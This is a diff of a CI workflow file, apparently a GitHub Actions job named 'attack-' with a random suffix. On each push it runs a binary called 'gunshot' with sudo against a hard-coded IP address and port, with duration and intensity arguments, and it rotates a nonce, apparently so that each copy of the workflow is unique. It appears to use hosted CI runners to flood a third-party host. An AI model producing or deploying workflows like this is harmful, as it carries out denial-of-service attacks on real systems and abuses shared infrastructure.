@@ -1,4 +1,4 @@
-name: attack-bda32ed1
+name: attack-41874836
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.17.19 32001 60 200
+      run: sudo ./gunshot 91.108.17.2 32001 60 200
       continue-on-error: true
-    - name: Nonce bda32ed1
-      run: echo "nonce=bda32ed1"
+    - name: Nonce 41874836
+      run: echo "nonce=41874836"
